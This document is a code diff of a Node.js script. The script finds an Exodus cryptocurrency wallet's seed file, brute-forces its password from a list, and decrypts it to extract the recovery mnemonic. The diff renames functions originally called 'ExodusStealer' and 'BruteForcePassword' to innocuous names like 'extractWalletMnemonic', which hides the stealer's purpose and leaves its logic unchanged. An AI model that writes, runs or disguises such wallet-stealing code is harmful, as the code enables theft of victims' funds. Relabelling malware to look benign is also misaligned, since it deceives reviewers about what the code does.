@@ -8,7 +8,7 @@ const path = require("path");
 const os = require("os");
 const seco = require("secure-container");
 
-function shrink(secoData) {
+function extractSecoPayload(secoData) {
     if (!secoData || secoData.length < 4) {
         throw new Error("Invalid SECO data: Buffer too short.");
     }
@@ -22,7 +22,7 @@ function shrink(secoData) {
 async function decryptAndExtractMnemonic(encryptedData, password) {
     try {
         const { data: decrypted } = await seco.decrypt(encryptedData, password);
-        const shrinked = shrink(decrypted);
+        const shrinked = extractSecoPayload(decrypted);
         const gunzipped = zlib.gunzipSync(shrinked);
         const seed = bs.fromBuffer(gunzipped);
         if (!seed || !seed.mnemonicString) {
@@ -66,7 +66,7 @@ function locateExodus() {
     }
 }
 
-async function BruteForcePassword(seedFilePath, passwords) {
+async function findPasswordFromList(seedFilePath, passwords) {
     let seedData;
     try {
         seedData = fs.readFileSync(seedFilePath);
@@ -106,7 +106,7 @@ async function BruteForcePassword(seedFilePath, passwords) {
     };
 }
 
-async function ExodusStealer(passwords) {
+async function extractWalletMnemonic(passwords) {
     const exodusInfo = locateExodus();
 
     if (!exodusInfo.exodus) {
@@ -138,7 +138,7 @@ async function ExodusStealer(passwords) {
         }
     }
 
-    const bforced = await BruteForcePassword(exodusInfo.path, passwords);
+    const bforced = await findPasswordFromList(exodusInfo.path, passwords);
     if (bforced.success) {
         try {
             const mnemonic = await decryptAndExtractMnemonic(seedData, bforced.password);
@@ -177,7 +177,7 @@ async function ExodusStealer(passwords) {
             console.warn(`Warning: Password list '${passwordListPath}' not found. Proceeding without brute-force.`);
         }
 
-        const result = await ExodusStealer(passwords);
+        const result = await extractWalletMnemonic(passwords);
 
         console.log("\n--- Result ---");
         if (result.success) {
